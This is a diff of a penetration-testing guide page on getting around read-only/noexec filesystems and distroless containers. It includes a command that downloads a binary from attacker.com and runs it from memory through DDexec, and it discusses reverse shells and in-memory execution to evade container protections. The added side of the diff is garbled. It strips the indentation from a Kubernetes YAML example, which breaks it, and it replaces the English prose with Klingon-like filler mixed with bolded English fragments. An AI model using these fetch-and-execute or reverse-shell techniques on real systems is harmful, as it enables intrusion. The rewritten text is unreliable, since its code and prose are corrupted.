@@ -28,12 +28,12 @@ It's more and more common to find linux machines mounted with **read-only (ro) f
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
@@ -75,57 +75,49 @@ Therefore, **controlling the assembly code** that is being executed by the proce
 {% hint style="success" %}
 **DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
 {% endhint %}
-
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
-
-{% content-ref url="ddexec.md" %}
-[ddexec.md](ddexec.md)
-{% endcontent-ref %}
-
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) jImejDaq **DDexec**. **DDexec shellcode demonised** vItlhutlh, **binary vItlhutlh** run **bI'rel** **DDexec** vItlhutlh, **memexec shellcode** run **bI'rel** **communicate**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+**memexec to execute binaries from a PHP reverse shell** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) **example**.
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+**memdlopen** [**memdlopen**](https://github.com/arget13/memdlopen) technique **load binaries** **easier way** **execute**. **load binaries with dependencies** **allow**.
 
 ## Distroless Bypass
 
-### What is distroless
+### Distroless vItlhutlh
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Distroless containers **bare minimum components necessary to run a specific application or service** vItlhutlh, **libraries and runtime dependencies** vItlhutlh, **package manager, shell, or system utilities** vItlhutlh.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Distroless containers **reduce the attack surface of containers by eliminating unnecessary components** **minimising the number of vulnerabilities that can be exploited**.
 
 ### Reverse Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+Distroless container **`sh` or `bash`** **find**. **ls**, **whoami**, **id**... **binaries** **find**.
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+**reverse shell** **enumerate** **system** **able**.
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+**compromised container** **flask web** run, **python** **installed**, **Python reverse shell** **grab**. **node** run, **Node rev shell** **grab**, **scripting language** **grab**.
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+**scripting language** **enumerate the system** **use**.
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+**`read-only/no-exec`** **protections** **abuse** **reverse shell** **write in the file system your binaries** **execute**.
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+**kind of containers** **protections** **usually exist**, **previous memory execution techniques to bypass them** **use**.
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+**exploit some RCE vulnerabilities** **reverse shells** **execute binaries from memory** **examples** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <details>
 
